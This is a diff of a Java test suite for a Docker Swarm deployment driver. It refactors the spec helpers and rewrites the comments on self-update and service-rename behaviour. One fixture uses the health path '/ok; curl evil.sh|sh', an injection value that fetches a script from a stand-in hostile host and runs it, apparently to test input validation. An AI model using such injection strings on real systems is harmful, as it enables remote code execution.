-        spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()));
+    driver.apply(spec());
 
     assertTrue(cli.matching("service rm").isEmpty(), "a failed inspect is never a reason to remove");
     assertFalse(cli.matching("service update").isEmpty());
@@ -820,18 +893,27 @@ class SwarmDeploymentDriverTest {
 
   @Test
   void theDeployersOwnServiceIsNeverRemovedToGiveItAnAlias() {
-    // The deployer is a platform service too, so it is exactly the fleet this arm is for — and it
-    // is the one member that must never take it. Removing the service this process answers on would
-    // leave nothing to create the successor; the alias waits for a hand that is not this one.
-    SwarmDeploymentDriver driver = driver();
+    // The one member of the fleet that must never take this arm. Removing the service this process
+    // answers on would leave nothing to create the successor; the alias waits for a hand that is
+    // not this one.
+    //
+    // The deployer used to be a PLATFORM service, which is how this test used to stage itself — a
+    // platform spec, the bare `qits-gateway` label, and the derived alias as the thing being
+    // withheld. There is no plane and no derived alias, so the deployer is an ordinary service
+    // named after its wire alias like everything else, and the alias it would be recreated for is
+    // one config declares. The claim is untouched: a self-update does not even ASK, because no
+    // answer could make removing itself right.
+    SwarmDeploymentDriver driver =
+        driver(
+            Map.of(
+                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
+                "registry.dev.localhost"));
     driver.hostnameFile = hostnameFile("task-container-id");
-    cli.script("Config.Labels", result(0, "qits-gateway"));
+    cli.script("Config.Labels", result(0, "dev-qits-gateway"));
     cli.script("--format {{.ID}}", result(0, "svc123"));
     cli.script("TaskTemplate.Networks", result(0, ""));
 
-    DeploymentDriver.ApplyResult applied =
-        driver.apply(
-            spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()));
+    DeploymentDriver.ApplyResult applied = driver.apply(spec());
 
     assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
     assertTrue(cli.matching("service rm").isEmpty(), "never its own service");
@@ -847,7 +929,6 @@ class SwarmDeploymentDriverTest {
         driver()
             .buildUpdateArgv(
                 spec(
-                    PdDeploymentTarget.ENVIRONMENT,
                     DeploymentDriver.UpdateOrder.STOP_FIRST,
                     List.of()),
                 "dev-qits-gateway");
@@ -990,7 +1071,6 @@ class SwarmDeploymentDriverTest {
     List<String> argv =
         driver.buildCreateArgv(
             spec(
-                PdDeploymentTarget.ENVIRONMENT,
                 DeploymentDriver.UpdateOrder.START_FIRST,
                 DeploymentDriver.PublishMode.INGRESS,
                 List.of()),
@@ -1015,7 +1095,6 @@ class SwarmDeploymentDriverTest {
         driver()
             .buildUpdateArgv(
                 spec(
-                    PdDeploymentTarget.ENVIRONMENT,
                     DeploymentDriver.UpdateOrder.STOP_FIRST,
                     DeploymentDriver.PublishMode.INGRESS,
                     List.of()),
@@ -1041,7 +1120,6 @@ class SwarmDeploymentDriverTest {
             () ->
                 driver.buildCreateArgv(
                     spec(
-                        PdDeploymentTarget.ENVIRONMENT,
                         DeploymentDriver.UpdateOrder.START_FIRST,
                         DeploymentDriver.PublishMode.INGRESS,
                         List.of()),
@@ -1185,7 +1263,6 @@ class SwarmDeploymentDriverTest {
         spec.imageRef(),
         spec.healthPath(),
         spec.healthCmd(),
-        spec.target(),
         spec.availableOnEnv(),
         spec.updateOrder(),
         spec.publishMode(),
@@ -1448,7 +1525,6 @@ class SwarmDeploymentDriverTest {
         driver()
             .buildCreateArgv(
                 spec(
-                    PdDeploymentTarget.ENVIRONMENT,
                     DeploymentDriver.UpdateOrder.START_FIRST,
                     List.of(
                         DeploymentDriver.ResourceBinding.postgres(
@@ -1475,7 +1551,6 @@ class SwarmDeploymentDriverTest {
         driver()
             .buildCreateArgv(
                 spec(
-                    PdDeploymentTarget.ENVIRONMENT,
                     DeploymentDriver.UpdateOrder.START_FIRST,
                     List.of(
                         DeploymentDriver.ResourceBinding.idp(
@@ -1533,7 +1608,6 @@ class SwarmDeploymentDriverTest {
             IMAGE,
             "/ok; curl evil.sh|sh",
             null,
-            PdDeploymentTarget.ENVIRONMENT,
             true,
             DeploymentDriver.UpdateOrder.START_FIRST,
             DeploymentDriver.PublishMode.HOST,
@@ -1975,34 +2049,39 @@ class SwarmDeploymentDriverTest {
   }
 
   @Test
-  void aFlipToThePlatformPlaneIsACreateBesideTheEnvNamedService() {
-    // What the deployer's own re-planing does here, and it is NOT a self-update. A service name is
-    // its address under swarm, so a platform-shaped spec asks for the bare alias while this process
-    // runs as the env-named one — two different services, which swarm cannot rename into each
-    // other. So the successor is created beside the predecessor, and `reap` removes nothing
-    // (a replace is normally in place). Removing the predecessor is a hand step; README's
-    // "Self-update takes an orchestrator" spells it out.
+  void aRenamedServiceIsACreateBesideTheOneThisProcessRunsAs() {
+    // This test was `aFlipToThePlatformPlaneIsACreateBesideTheEnvNamedService`, and it drove the
+    // case with a PLATFORM spec: the deployer re-planing itself asked for the bare alias while the
+    // process ran as the env-named service. The plane is deleted, so there is no re-planing left to
+    // stage — but the SITUATION it exercised is exactly the one the plane's deletion creates, with
+    // the two names the other way round.
+    //
+    // A swarm service's NAME is its address and swarm cannot rename one, so the nine services that
+    // were the plane are renamed by being created anew: `qits-ci` becomes `dev-qits-ci`, a second
+    // service, while the first is still serving. (That is why the qualified name was granted as an
+    // extra network alias one release earlier — nothing is left dialling a name nothing answers to
+    // while the two coexist.) Here this process runs as the old bare-named service and the spec
+    // asks for the qualified one: two different services, so this is NOT a self-update, nothing is
+    // handed off, the successor is created beside the predecessor, and `reap` removes nothing —
+    // a replace is normally in place, and this is not a replace. Removing the predecessor is a hand
+    // step; README's "Self-update takes an orchestrator" spells it out.
     SwarmDeploymentDriver driver = driver();
     driver.hostnameFile = hostnameFile("this-task-container");
-    cli.script("Config.Labels", result(0, "dev-qits-gateway"));
-    cli.script("--format {{.ID}} qits-gateway", result(1, "no such service"));
-    cli.script("--format {{.ID}} qits_qits-gateway", result(1, "no such service"));
+    cli.script("Config.Labels", result(0, "qits-gateway"));
+    cli.script("--format {{.ID}} dev-qits-gateway", result(1, "no such service"));
+    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
 
     DeploymentDriver.ApplyResult applied =
-        driver.apply(
-            spec(
-                PdDeploymentTarget.PLATFORM,
-                DeploymentDriver.UpdateOrder.STOP_FIRST,
-                List.of()));
+        driver.apply(spec(DeploymentDriver.UpdateOrder.STOP_FIRST, List.of()));
 
     assertEquals(
         DeploymentDriver.ApplyOutcome.APPLIED,
         applied.outcome(),
-        "the env-named predecessor is not this spec's service, so nothing is handed off");
+        "the bare-named predecessor is not this spec's service, so nothing is handed off");
     List<String> create = cli.matching("service create");
-    assertTrue(create.containsAll(List.of("--name", "qits-gateway")), create.toString());
+    assertTrue(create.containsAll(List.of("--name", "dev-qits-gateway")), create.toString());
     assertTrue(
-        cli.matching("service rm").isEmpty(), "nothing removes the env-named predecessor for us");
+        cli.matching("service rm").isEmpty(), "nothing removes the bare-named predecessor for us");
   }
 
   @Test
